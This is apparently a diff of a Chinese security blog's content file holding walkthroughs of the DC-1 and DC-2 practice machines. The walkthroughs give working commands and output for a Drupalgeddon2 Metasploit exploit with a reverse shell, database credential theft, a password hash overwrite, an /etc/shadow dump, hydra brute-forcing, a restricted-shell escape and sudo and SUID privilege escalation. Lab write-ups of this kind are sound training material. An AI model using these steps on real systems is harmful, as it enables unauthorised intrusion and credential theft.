-<p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p>
-<p>用法参考：<a href="https://www.cnblogs.com/WangYiqiang/p/9490869.html">https://www.cnblogs.com/WangYiqiang/p/9490869.html</a></p>
-</blockquote>
-<p><code>wpscan --url http://dc-2 --enumerate u</code>或<code>wpscan --ignore-main-redirect --url 192.168.85.137 --enumerate u --force</code>或<code>wpscan --url http://dc-2/ -e u</code></p>
-<p>扫出来三个用户</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>将这三个用户写入dc-2users.txt。</p>
-<p>使用生成的password和用户名通过hydra进行爆破</p>
-<blockquote>
-<p>hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种协议密码，并且还支持生成密码字典，有GUI图形和命令行两种非常容易上手。</p>
-<p>用法参考：<a href="https://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html">https://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html</a></p>
-</blockquote>
-<p>命令<code>hydra -L dc-2users.txt -P dc2_passwords.txt dc-2 http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</code></p>
-<blockquote>
-<p>-l ——&gt; 表示单个用户名（使用-L表示用户名列表）<br>-P ——&gt; 表示使用以下密码列表<br>http-post-form ——&gt; 表示表单的类型<br>/ dvwa / login-php ——&gt; 是登录页面URL<br>username ——&gt; 是输入用户名的表单字段<br>^ USER ^ ——&gt; 告诉Hydra使用字段中的用户名或列表<br>password是输入密码的表单字段（可以是passwd，pass等）<br>^ PASS ^ ——&gt; 告诉Hydra使用提供的密码列表</p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# hydra -L dc-2users.txt -P dc2_passwords.txt dc-2 http-form-post &#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#x27;</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-04 16:18:12</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 714 login tries (l:3/p:238), ~45 tries per task</span><br><span class="line">[DATA] attacking http-post-form://dc-2:80/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location</span><br><span class="line">[80][http-post-form] host: dc-2   login: tom   password: parturient</span><br><span class="line">[80][http-post-form] host: dc-2   login: jerry   password: adipiscing</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-04 16:18:58</span><br></pre></td></tr></table></figure>
-
-<p>也可以用wpscan来爆破出可以登录的用户名密码</p>
-<p><code>wpscan --url http://dc-2 -U dc-2users.txt -P dc2_passwords.txt</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[+] Performing password attack on Xmlrpc against 3 user/s</span><br><span class="line">[SUCCESS] - jerry / adipiscing                                                                                         [SUCCESS] - tom / parturient  </span><br></pre></td></tr></table></figure>
-
-<p>先去登录一下看看，发现只有jerry用户登录后发现了flag2</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line">If you can&#39;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>
-
-<p>尝试ssh远程登录，发现只有tom能登录成功</p>
-<p><code>ssh tom@192.168.85.137 -p 7744</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# ssh tom@192.168.126.136 -p 7744                                                                                                                                                                           255 ⨯</span><br><span class="line">The authenticity of host &#x27;[192.168.126.136]:7744 ([192.168.126.136]:7744)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:ZbyT03GNDQgEmA5AMiTX2N685NTzZuOoyMDIA+DW1qU.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;[192.168.126.136]:7744&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">tom@192.168.126.136&#x27;s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">tom@DC-2:~$ </span><br></pre></td></tr></table></figure>
-
-<p>输入几个常见命令后发现：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ whoami</span><br><span class="line">-rbash: whoami: command not found</span><br></pre></td></tr></table></figure>
-
-<p>出现了-rbash<del>….这啥啊也没见过啊</del></p>
-<blockquote>
-<p>参考文章：</p>
-<p><a href="https://www.anquanke.com/post/id/173159">https://www.anquanke.com/post/id/173159</a></p>
-<p><a href="https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/">https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/</a></p>
-<p><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html">https://www.cnblogs.com/zaqzzz/p/12075132.html</a></p>
-</blockquote>
-<p>输入<code>BASH_CMDS[a]=/bin/sh;a</code>然后回车再输入<code>/bin/bash</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a</span><br><span class="line"><span class="meta">$</span><span class="bash"> /bin/bash</span></span><br><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">bash: cat: command not found</span><br></pre></td></tr></table></figure>
-
-<p>之后输入<code>export PATH=$PATH:/bin/</code>或<code>export PATH=/usr/sbin:/usr/bin:/sbin:/bin</code></p>
-<blockquote>
-<p>PATH就是定义/bin:/sbin:/usr/bin等这些路径的变量，其中冒号为目录间的分割符。</p>
-<p>可以用export -p查看当前所有的shell赋予程序的环境变量</p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>
-
-<p>好家伙，又一个提示出来了<code>su</code>那就切换到jerry用户</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ su jerry</span><br><span class="line">Password: </span><br><span class="line">jerry@DC-2:/home/tom$ ls</span><br><span class="line">ls: cannot open directory .: Permission denied</span><br><span class="line">jerry@DC-2:/home/tom$ cd ../</span><br><span class="line">jerry@DC-2:/home$ cd jerry</span><br><span class="line">jerry@DC-2:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">jerry@DC-2:~$ cat flag4.txt</span><br><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. </span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>
-
-<p>又一个提示：git</p>
-<p>查看sudo配置文件，发现git是root不用密码可以运行，接着进行git提权。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo -l</span><br><span class="line">Matching Defaults entries for jerry on DC-2:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC-2:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure>
-
-<p>输入<code>sudo git -p help</code>（注意调整窗口使一页不能显示完</p>
-<p>在最下边输入<code>!/bin/bash</code> </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo git -p help</span><br><span class="line">usage: git [--version] [--help] [-C &lt;path&gt;] [-c name=value]</span><br><span class="line">           [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path]</span><br><span class="line">           [-p|--paginate|--no-pager] [--no-replace-objects] [--bare]</span><br><span class="line">           [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;]</span><br><span class="line">           &lt;command&gt; [&lt;args&gt;]</span><br><span class="line"></span><br><span class="line">The most commonly used git commands are:</span><br><span class="line">   add        Add file contents to the index</span><br><span class="line">   bisect     Find by binary search the change that introduced a bug</span><br><span class="line">   branch     List, create, or delete branches</span><br><span class="line">   checkout   Checkout a branch or paths to the working tree</span><br><span class="line">   clone      Clone a repository into a new directory</span><br><span class="line">   commit     Record changes to the repository</span><br><span class="line">   diff       Show changes between commits, commit and working tree, etc</span><br><span class="line">   fetch      Download objects and refs from another repository</span><br><span class="line">   grep       Print lines matching a pattern</span><br><span class="line">   init       Create an empty Git repository or reinitialize an existing one</span><br><span class="line">   log        Show commit logs</span><br><span class="line">   merge      Join two or more development histories together</span><br><span class="line">!/bin/bash</span><br><span class="line">root@DC-2:/home/jerry# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-
-<p>提权成功（此时可以修改root账户密码</p>
-<p>cat一下final-flag.txt</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@DC-2:/# cd ~                                                                                                       root@DC-2:~# ls                                                                                                         final-flag.txt                                                                                                         root@DC-2:~# cat final-flag.txt                                                                                          __    __     _ _       _                    _                                                                            / / /\ \ \___| | |   __| | ___  _ __   ___  / \                                                                          \ \/  \/ / _ \ | |  / _` |/ _ \| &#x27;_ \ / _ \/  /                                                                          \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/                                                                           \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/                                                                                                                                                                        </span><br><span class="line">Congratulatons!!!                                                                                                       A special thanks to all those who sent me tweets                                                                       and provided me with feedback - it&#x27;s all greatly                                                                       appreciated.                                                                                                           If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
+<h3 id="流量包修复"><a href="#流量包修复" class="headerlink" title="流量包修复"></a>流量包修复</h3><p>在线网站：<a href="https://f00l.de/hacking/pcapfix.php">https://f00l.de/hacking/pcapfix.php</a></p>
+<p>github项目：<a href="https://github.com/Rup0rt/pcapfix/tree/devel">https://github.com/Rup0rt/pcapfix/tree/devel</a></p>
+<h3 id="web流量分析"><a href="#web流量分析" class="headerlink" title="web流量分析"></a>web流量分析</h3><p>WEB数据包分析的题目主要出现WEB攻击行为的分析上， 典型的WEB攻击行为有：WEB扫描、后台目录爆破、后台账号爆破、WEBSHELL上传、SQL注入等。</p>
+<h4 id="web扫描分析"><a href="#web扫描分析" class="headerlink" title="web扫描分析"></a>web扫描分析</h4><p>常见扫描器特征分析：<a href="https://cn-sec.com/archives/309388.html">https://cn-sec.com/archives/309388.html</a></p>
 ]]></content>
       <categories>
-        <category>内网靶机练习</category>
+        <category>Misc</category>
+        <category>流量分析</category>
       </categories>
   </entry>
   <entry>
@@ -2134,6 +1910,230 @@
 ]]></content>
       <categories>
         <category>比赛复现</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>DC系列靶机</title>
+    <url>/2021/05/14/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/</url>
+    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
+
+<h3 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h3><p>kali：192.168.126.128                                                靶机：192.168.126.135</p>
+<p>先<code>arp-scan -l</code>扫一下ip，再用nmap扫端口<code>nmap -v -A 192.168.126.135</code>或<code>nmap -sV -p-192.168.126.135</code></p>
+<blockquote>
+<p>arp-scan命令： 是一个用来进行系统发现的ARP命令行扫描工具（可以发现本地网络中的隐藏设备）。它可以构造并发送ARP请求到指定的IP地址，并且显示返回的任何响应。</p>
+<p>arp-scan 可以显示本地网络中的所有连接设备，即使这些设备有防火墙。设备可以屏蔽ping，但是并不能屏蔽ARP数据包。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//nmap -sV -p- 192.168.126.135</span><br><span class="line">┌──(root💀hack)-[~]</span><br><span class="line">└─# nmap -sV -p- 192.168.126.135</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 11:48 CST</span><br><span class="line">Nmap scan report for 192.168.126.135</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">34271/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:50:56:22:CC:DD (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.05 seconds</span><br></pre></td></tr></table></figure>
+
+<p>发现存在web服务，用whatweb扫一下<code>whatweb 192.168.126.135</code>或<code>whatweb -v 192.168.126.135</code>（更详细）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀hack)-[~]</span><br><span class="line">└─# whatweb 192.168.126.135 </span><br><span class="line">http://192.168.126.135 [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.126.135], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>处理思路：</p>
+<p>​    针对扫描出的开放服务（应用程序）的处理思路：</p>
+<p>​            1、针对版本搜索相关漏洞；</p>
+<p>​             2、针对协议本身；</p>
+</blockquote>
+<p>发现对应cms为Drupal7，直接上msf（msfconsole）搜索drupal的可用洞</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search drupal</span><br><span class="line">                                                                                                                       Matching Modules                                                                                                       ================                                                                                                          #  Name                                           Disclosure Date  Rank       Check  Description                                                                                                                                          </span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------                        0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution                                                                                                          1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection                                                                                                   </span><br><span class="line">   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection                                                                                                        </span><br><span class="line">   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection                                                                                                              </span><br><span class="line">   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution                                                                                                       </span><br><span class="line">   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE                                                                                                          6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration                                                                                                                7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution                                                                                                                 </span><br><span class="line">                                                                                                                     </span><br><span class="line">Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval </span><br></pre></td></tr></table></figure>
+
+<p>选择时间比较新的利用，这里使用18年对应的那个 </p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp                                                   msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options                                                           Module options (exploit/unix/webapp/drupal_drupalgeddon2):                                                                                                                                                                                   </span><br><span class="line">   Name         Current Setting  Required  Description                                                                                                                                                                                       </span><br><span class="line">   ----         ---------------  --------  -----------                                                                                                                                                                                       </span><br><span class="line">   DUMP_OUTPUT  false            no        Dump payload command output                                                                                                                                                                       </span><br><span class="line">   PHP_FUNC     passthru         yes       PHP function to execute                                                                                                                                                                           </span><br><span class="line">   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.126.128  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.126.135</span><br><span class="line">rhost =&gt; 192.168.126.135</span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.126.128:4444 </span><br><span class="line">[*] Executing automatic check (disable AutoCheck to override)</span><br><span class="line">[!] The service is running, but could not be validated.</span><br><span class="line">[*] Sending stage (39282 bytes) to 192.168.126.135</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.126.128:4444 -&gt; 192.168.126.135:40437) at 2021-08-03 11:58:47 +0800</span><br></pre></td></tr></table></figure>
+
+<p><code>rhost对应的是靶机ip</code></p>
+<p>接下来出现<code>meterpreter &gt; </code>说明成功执行了exploit</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#弹出交互式teriminal</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3485 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure>
+
+<p>先查看当前目录下的文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ ls</span><br><span class="line">ls</span><br><span class="line">LICENSE.txt      flag1.txt    profiles    web.config</span><br><span class="line">COPYRIGHT.txt       MAINTAINERS.txt  includes     robots.txt  xmlrpc.php</span><br><span class="line">INSTALL.mysql.txt   README.txt       index.php    scripts</span><br><span class="line">INSTALL.pgsql.txt   UPGRADE.txt      install.php  sites</span><br><span class="line">INSTALL.sqlite.txt  authorize.php    misc         themes</span><br><span class="line">INSTALL.txt         cron.php         modules      update.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现了flag1.txt，cat一下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">w-data@DC-1:/var/www$ cat flag1.txt</span><br><span class="line">cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line">//大概意思就是要找到对应的config文件</span><br></pre></td></tr></table></figure>
+
+<p>利用find命令找一下settings.php</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find -name &#x27;settings.php&#x27;</span><br><span class="line">find -name &#x27;settings.php&#x27;</span><br><span class="line">./sites/default/settings.php</span><br><span class="line">www-data@DC-1:/var/www$ cat ./sites/default/settings.php</span><br><span class="line">cat ./sites/default/settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">databases = array (</span></span><br><span class="line">  &#x27;default&#x27; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+
+<p>在这里发现了flag2，大概意思是<strong>暴力和字典攻击并不是获得访问权限的唯一方法（而且你需要访问权限），你将如何处理这些数据？</strong>在文件中还看到了数据库的相关信息并且给出了一个低权限的账号，先查看一下数据库。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use drupaldb</span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| ......                      |</span><br><span class="line">| users                       |</span><br><span class="line">| ......                      |</span><br><span class="line">+-----------------------------+</span><br><span class="line">80 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>uid</th>
+<th>name</th>
+<th>pass</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>admin</td>
+<td>$S$DxQCTfic1drhqY7jbCf62drw/T204r3is./KmIUKEzlQUpfHx1RQ</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Fred</td>
+<td>$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</td>
+</tr>
+</tbody></table>
+<p>users表中有两个账户，但是密码经过加密无法查看，可以结合drupal的机密文件来修改密码。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cd scripts</span><br><span class="line">cd scripts</span><br><span class="line">www-data@DC-1:/var/www/scripts$ cp -r ../includes ./</span><br><span class="line">cp -r ../includes ./</span><br><span class="line">www-data@DC-1:/var/www/scripts$ ls</span><br><span class="line">ls</span><br><span class="line">code-clean.sh  drupal.sh            generate-d6-content.sh  password-hash.sh</span><br><span class="line">cron-curl.sh   dump-database-d6.sh  generate-d7-content.sh  run-tests.sh</span><br><span class="line">cron-lynx.sh   dump-database-d7.sh  includes                test.script</span><br><span class="line">www-data@DC-1:/var/www/scripts$ ./password-hash.sh t0mr</span><br><span class="line">./password-hash.sh t0mr</span><br><span class="line"></span><br><span class="line">password: t0mr          hash: $S$DXk.TovSUw5QaQCopN17mumoRyldcf.UDXd40tEI5QluWgHqMQmA</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接下来去数据库中更新密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update users set pass &#x3D; &#39;$S$DXk.TovSUw5QaQCopN17mumoRyldcf.UDXd40tEI5QluWgHqMQmA&#39; where name &#x3D; &#39;admin&#39;;</span><br><span class="line">&lt;17mumoRyldcf.UDXd40tEI5QluWgHqMQmA&#39; where name &#x3D; &#39;admin&#39;;                   </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure>
+
+<p>这时候就可以回去登陆了</p>
+<p>在dashboard看到了flag3，内容是：**Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.**大概意思是告诉我需要怎么找到密码，但是需要exec和shadow。</p>
+<p>点击flag3后，关注点放到passwd文件和shadow文件。Linux为了考虑安全性，用单独的shadow文件存储Linux用户的密码信息，并且只有root用户有权限读取此文件。所以下一步，我们要考虑的是提权了。<br>采用find提权。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www/scripts$ touch 123</span><br><span class="line">touch 123</span><br><span class="line">www-data@DC-1:/var/www/scripts$ find / -name 123 -exec &quot;whoami&quot; \;</span><br><span class="line">find / -name 123 -exec &quot;whoami&quot; \;</span><br><span class="line">root</span><br><span class="line">www-data@DC-1:/var/www$ find / -name 123 -exec &quot;/bin/sh&quot; \;</span><br><span class="line">find / -name 123 -exec &quot;/bin/sh&quot; \;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>
+
+<p>提权成功后，查看shadow文件。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/shadow</span></span><br><span class="line">cat /etc/shadow</span><br><span class="line">root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::</span><br><span class="line">daemon:*:17946:0:99999:7:::</span><br><span class="line">bin:*:17946:0:99999:7:::</span><br><span class="line">sys:*:17946:0:99999:7:::</span><br><span class="line">sync:*:17946:0:99999:7:::</span><br><span class="line">games:*:17946:0:99999:7:::</span><br><span class="line">man:*:17946:0:99999:7:::</span><br><span class="line">lp:*:17946:0:99999:7:::</span><br><span class="line">mail:*:17946:0:99999:7:::</span><br><span class="line">news:*:17946:0:99999:7:::</span><br><span class="line">uucp:*:17946:0:99999:7:::</span><br><span class="line">proxy:*:17946:0:99999:7:::</span><br><span class="line">www-data:*:17946:0:99999:7:::</span><br><span class="line">backup:*:17946:0:99999:7:::</span><br><span class="line">list:*:17946:0:99999:7:::</span><br><span class="line">irc:*:17946:0:99999:7:::</span><br><span class="line">gnats:*:17946:0:99999:7:::</span><br><span class="line">nobody:*:17946:0:99999:7:::</span><br><span class="line">libuuid:!:17946:0:99999:7:::</span><br><span 